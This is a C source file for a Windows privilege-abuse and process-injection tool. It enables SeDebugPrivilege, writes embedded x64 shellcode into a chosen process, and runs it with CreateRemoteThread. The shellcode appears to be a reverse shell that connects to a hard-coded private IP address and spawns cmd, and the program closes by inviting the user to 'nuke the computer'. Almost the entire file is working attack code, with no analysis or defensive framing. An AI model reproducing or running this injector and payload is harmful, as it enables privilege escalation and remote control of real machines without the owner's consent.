#include <Windows.h>
#include <stdio.h>

int main(int argc, char* argv[]) {

	if (argc < 2) {
		printf("\n[!] Usage: SeDebugPrivilegeAbuse.exe <PID>\n\n");
		return EXIT_FAILURE;
	}
	printf("\n[*] Starting exploitation..\n");
	Sleep(400);

	DWORD PID = atoi(argv[1]);

	unsigned char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
		"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
		"\x00\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\xc0\xa8\xb6\xa5"
		"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
		"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
		"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
		"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
		"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
		"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
		"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
		"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
		"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
		"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
		"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
		"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
		"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
		"\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
		"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
		"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";

	DWORD oldprotect = 0;
	DWORD TID;
	HANDLE tkHandle;
	TOKEN_PRIVILEGES tkPriv;

	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &tkHandle)) {
		printf("[!] Failed to get the access token of current process.\nExiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] Got the access token of current process.\n");
	Sleep(400);

	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkPriv.Privileges[0].Luid)) {
		printf("[!] LookUpPrivilegeValue() Failed.\nExiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] LookupPrivilegeValue() success. Proceeding..\n");
	Sleep(400);

	tkPriv.PrivilegeCount = 1;
	tkPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(tkHandle, FALSE, &tkPriv, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
		printf("[!] AdjustTokenPrivileges() Failed.\n");
		return EXIT_FAILURE;
	}
	printf("[+] AdjustTokenPrivileges() success.\n");
	Sleep(400);

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, PID);
	if (hProcess == NULL) {
		printf("[!] Failed to get an handle to the target process.\nExiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] Got an handle to the target process.\n");
	Sleep(400);

	LPVOID virtualmem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
	if(virtualmem==NULL){
		printf("[!] Memory allocation failed.\nExiting with error: %ld\n");
		return EXIT_FAILURE;
	}
	printf("[+] Memory allocated successfully at\n\t\\----0x%p\n",virtualmem);
	Sleep(400);
	printf("[*] Attempting to write shellcode into memory.\n");

	for (int i=0; i < sizeof(shellcode); i++) {
		if (i % 16 == 0) {
			printf("\n ");
		}
		Sleep(1);
		printf(" %02X", shellcode[i]);
	}

	if (!WriteProcessMemory(hProcess, virtualmem, shellcode, sizeof(shellcode), NULL)) {
		printf("[!] Failed to write shellcode into memory.\nExiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("\n[+] Shellcode written into memory.\n");
	Sleep(400);

	if (!VirtualProtectEx(hProcess, virtualmem, sizeof(shellcode), PAGE_EXECUTE_READ, &oldprotect)) {
		printf("[!] Failed to change memory protection.\nExiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] Memory protection changed from PAGE_READWRITE to PAGE_EXECUTE_READ\n");
	Sleep(400);

	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)virtualmem, NULL, 0, &TID);
	if(hThread==NULL){
		printf("[!] Failed to create a thread for shellcode execution.\nExiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] Thread created successfully.\n");
	printf("[+] Enjoy your super high privileged shell and nuke the computer!!!\n");

	WaitForSingleObject(hThread, INFINITE);

	printf("[*] Cleaning up..\n");
	CloseHandle(hProcess);
	CloseHandle(hThread);

	return EXIT_SUCCESS;
}